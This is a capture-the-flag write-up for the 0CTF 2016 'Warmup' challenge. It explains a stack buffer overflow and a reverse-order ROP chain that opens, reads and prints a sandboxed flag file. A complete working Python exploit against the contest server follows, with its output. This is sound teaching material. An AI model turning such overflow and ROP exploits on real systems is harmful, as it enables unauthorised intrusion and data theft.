# 0ctf : Warmup

#### Author: ispo

The binary for that challenge was pretty small. Attacking small binaries is generally easier as
there are fewer attack options.

My first thought was to somehow execute an execve("/bin/cat", ["/bin/cat","/home/warmup/flag",NULL]).
Although this solution worked locally, I couldn't execute it on remote server due to sandbox
protection. The right solution is to open() and read() the flag file. Let's start:

The overflow was very easy to find:

    .text:0804815A 83 EC 30              sub     esp, 30h
    .text:0804815D C7 04 24 00 00 00+    mov     dword ptr [esp], 0
    .text:08048164 8D 44 24 10           lea     eax, [esp+10h]
    .text:08048168 89 44 24 04           mov     [esp+4], eax
    .text:0804816C C7 44 24 08 34 00+    mov     dword ptr [esp+8], 34h
    .text:08048174 E8 A4 FF FF FF        call    read_804811D

We read 0x34 bytes but our buffer is 0x30-0x10 = 0x20 bytes. So overflow it's trivial, but what we
should do next? The exploitation process is the following:

    [1]. Write the flag string ("/home/warmup/flag") somewhere in memory in a PIE location
	[2]. Call open() to open flag file
	[3]. Read flag from file
	[4]. Print flag to the user

In order to execute open(), we have to set eax to 5, fill ebx, ecx and edx with right values and
then do the system call. However the only way to set eax to 5, is to do another system call which
will have a return value of 5. Then we can directly jump to 1 instruction after read() or write()
function (to skip the eax set) and call open().

However, the direct approach doesn't work here, because there's no use of rbp. Let's assume that
we overflow and get control of eip. At that point the stack will be:

		+---------------------+
		| return address      |
		+---------------------+
	-->	| next return address |
		+---------------------+
		| 1st arg for syscall |
		+---------------------+
		| 2nd arg for syscall |
		+---------------------+
		| 3rd arg for syscall |
		+---------------------+

This means that we can execute a read/write with controlled arguments and set eax to the desired
value. Then we can return to the read(). However the 1st argument of read() will be the 2nd
argument of open(), etc., which means that it's impossible to call read() with the right arguments.
Even worse once we execute read(), we'll try to return to the 1st argument of open(), which will
cause a segfault. The problem here is that the stack frames overlap, so the same values are reused
as different arguments. We can solve this problem using a simple trick: Instead of returning
directly to a function, we return a "pop gadget" and then we return to the next function. Thus,
they will be no overlap between frames. Here's our pop gadget:

    .text:080481B8 83 C4 30              add     esp, 30h
    .text:080481BB C3                    retn

This seems nice, but it doesn't work because the next frame will be 48 bytes below, and we
can read up to 52 bytes. But if we could read more bytes, then we could do our rop attack. If
ASLR was disabled, we could do a read() -we can control all the arguments- somewhere on the stack
and fill the stack with our desired value. We need a different trick though.

The key for this attack is in the first command of the program:

    .text:080480D8 83 EC 10              sub     esp, 10h

Let's assume that esp = X when we start. After the 1st instruction it will be X-16. When we call
get_inp:

    .text:0804815A                   get_inp_804815A:            ; CODE XREF: .text:08048103
    .text:0804815A 83 EC 30              sub     esp, 30h
    .text:0804815D C7 04 24 00 00 00+    mov     dword ptr [esp], 0
    .text:08048164 8D 44 24 10           lea     eax, [esp+10h]
    .text:08048168 89 44 24 04           mov     [esp+4], eax
    .text:0804816C C7 44 24 08 34 00+    mov     dword ptr [esp+8], 34h
    .text:08048174 E8 A4 FF FF FF        call    read_804811D
    .text:08048179 C7 04 24 01 00 00+    mov     dword ptr [esp], 1
    .text:08048180 C7 44 24 04 D3 91+    mov     dword ptr [esp+4], 80491D3h
    .text:08048188 C7 44 24 08 0B 00+    mov     dword ptr [esp+8], 0Bh
    .text:08048190 E8 A0 FF FF FF        call    write_8048135
    .text:08048195 B8 AF BE AD DE        mov     eax, 0DEADBEAFh
    .text:0804819A B9 AF BE AD DE        mov     ecx, 0DEADBEAFh
    .text:0804819F BA AF BE AD DE        mov     edx, 0DEADBEAFh
    .text:080481A4 BB AF BE AD DE        mov     ebx, 0DEADBEAFh
    .text:080481A9 BE AF BE AD DE        mov     esi, 0DEADBEAFh
    .text:080481AE BF AF BE AD DE        mov     edi, 0DEADBEAFh
    .text:080481B3 BD AF BE AD DE        mov     ebp, 0DEADBEAFh
    .text:080481B8 83 C4 30              add     esp, 30h
    .text:080481BB C3        retn


esp becomes X-64 and upon return of get_inp() esp becomes again X-16. Note that it's possible to
overflow and fill values [X-16, X] during the overflow. If we overflow and set the return address
to the start (0x080480D8), then we can restart the program. But this time esp will be X-16. This
means that esp will become X - 32, and we can fill values [X-32, X-16] by doing the same overflow.
By doing this many times we can write as many values as we want in the stack. Then it's possible to
executing the pop gadget between and make stack frames not overlap each other.

This is tricky however, because we start filling the values from the bottom. This means that
we have to write the rop chain in reverse order. Thus, the first rop gadget that will read
the flag from file and the last gadget will read the "/home/warmup/flag" from stdin.

Another thing that we have to mention here that we don't know the file descriptor of the file
we open. We can open the flag file but we don't the file descriptor. Fortunately for us, OS
gives fd to the files in sequential order. So we can start from 3 (0=stdin, 1=stdout, 2=stderr),
until we guess it. But for fd=3 we have a solution :)

The python code shows very clearly the rop chain for this attack. After we execute the code we
get the flag: 0ctf{welcome_it_is_pwning_time}

### Code

    #!/usr/bin/env python2
    # --------------------------------------------------------------------------------------------------
    # Contest  : 0CTF 2016
    # Date     : 11/03 - 13/03/2015 (48hr)
    # Member   : ispo@b01lers
    # Challenge: Warmup (Pwn 2pt)
    # Protections: ASLR/DEP
    # Description: warmup for pwning!
    #			   Notice: This service is protected by a sandbox, you can only read the flag
    #              at /home/warmup/flag
    #
    #              202.120.7.207 52608
    #
    # (NOTE: for a better view set tab width to 4)
    # --------------------------------------------------------------------------------------------------
    import struct
    import sys
    import socket
    import struct
    import telnetlib

    # --------------------------------------------------------------------------------------------------
    def recv_until(st):                    		# receive until you encounter a string
      ret = ""
      while st not in ret:
        ret += s.recv(16384)

      return ret

    # --------------------------------------------------------------------------------------------------
    def overflow(a, b, c, d):					# overflow 16 bytes on the stack, and restart program

    	print recv_until('Welcome to 0CTF 2016!')	# eat input

    	p  = 'A' * 32								# overflow
    	p += struct.pack('<L', 0x080480D8)			# return to start()

    	p += struct.pack('<L', a)					# set the next 4 slots
    	p += struct.pack('<L', b)
    	p += struct.pack('<L', c)
    	p += struct.pack('<L', d)

    	s.send( p )									# send data. No \n cause these're already 52 bytes


    # --------------------------------------------------------------------------------------------------
    if __name__ == "__main__":

    	s = socket.create_connection(('202.120.7.207', 52608))  # connect to server
    	#s = socket.create_connection(('localhost', 7777))  	# connect to server

    	file_desc = 3 								# file descriptor to read from
    	flag_len  = 64								# how many bytes to read from flag file


    	''' =======================================================================
    		Fill ROP chain in reverse order
    	======================================================================= '''
    	overflow(0, 0, 0, 0)						# this used as padding

    	# 0x0804814D: address of exit()
    	# 0x00000001: stdout
    	# 0x080491D3: buffer to read flag
    	# flag_len  : bytes to print
    	overflow(0x0804814D, 0x00000001, 0x080491D3, flag_len)

    	# 0: unused
    	# 0: unused
    	# 0: unused
    	# 0x08048135: address of write()
    	overflow(0, 0, 0, 0x08048135)

    	overflow(0, 0, 0, 0)						# this used as padding

    	# 0x080491D3: buffer to store flag
    	# flag_len  : bytes to read from file
    	# 0: unused
    	# 0: unused
    	overflow(0x080491D3, flag_len, 0, 0)

    	# 0: unused
    	# 0x0804811D: address of read()
    	# 0x080481B8: pop gadget
    	# file_desc : open file descriptor to read from
    	overflow(0, 0x0804811D, 0x080481B8, file_desc)

    	overflow(0, 0, 0, 0)						# this used as padding
    	overflow(0, 0, 0, 0)						# this used as padding

    	# 0x080481B8: pop gadget
    	# 0x080491D3: buffer to store flag
    	# 0x00000000: O_RDONLY
    	# 0x00000004: mode
    	overflow(0x080481B8, 0x080491D3, 0x00000000, 0x00000004)

    	# 0: unused
    	# 0: unused
    	# 0: unused
    	# 0x0804813A: 1 intstruction after write() (without setting eax)
    	overflow(0, 0, 0, 0x0804813A)

    	overflow(0, 0, 0, 0)						# this used as padding

    	# 0x080491BC: address of "Welcome to 0CTF 2016!
    	# 0x00000005: open() syscall number
    	# 0: unused
    	# 0: unused
    	overflow(0x080491BC, 0x00000005, 0, 0)

    	# 0: unused
    	# 0x0804811D: address of read()
    	# 0x080481B8: pop gadget
    	# 0x00000000: stdin
    	overflow(0, 0x0804811D, 0x080481B8, 0x00000000)

    	overflow(0, 0, 0, 0)						# this used as padding
    	overflow(0, 0, 0, 0)						# this used as padding


    	''' =======================================================================
    		Now, we can start the actual attack
    	======================================================================= '''
    	p  = 'A'*32 								# overflow
    	p += struct.pack('<L', 0x0804811D)			# return to read()
    	p += struct.pack('<L', 0x080481B8)			# pop gadget
    	p += struct.pack('<L', 0x00000000)			# stdin
    	p += struct.pack('<L', 0x080491D3)			# addr of "Good Luck!"
    	p += struct.pack('<L', 0x00000012)			# read 18 bytes
    	s.send( p )

    	print s.recv(1024)


    	p  = '/home/warmup/flag\x00'				# 18 bytes
    	p += '1234\n'								# 5 bytes
    	s.send( p )

    	print s.recv(1024) + s.recv(1024) + s.recv(1024)

    	s.close()									# close socket
    # --------------------------------------------------------------------------------------------------
    '''
    root@xrysa:~/ctf/0ctf# ./warmup_expl_remote.py
    	Welcome to 0CTF 2016!

    	Good Luck!
    	Welcome to 0CTF 2016!

    	[..... TRUNCATED FOR BREVITY .....]

    	Good Luck!
    	Welcome to 0CTF 2016!

    	Good Luck!
    	Welcome to 0CTF 2016!

    	Good Luck!

    	Welcome to 0CTF 2016!
    	Good Luck!
    	0ctf{welcome_it_is_pwning_time}
    	.build-id.text
    '''
    # --------------------------------------------------------------------------------------------------
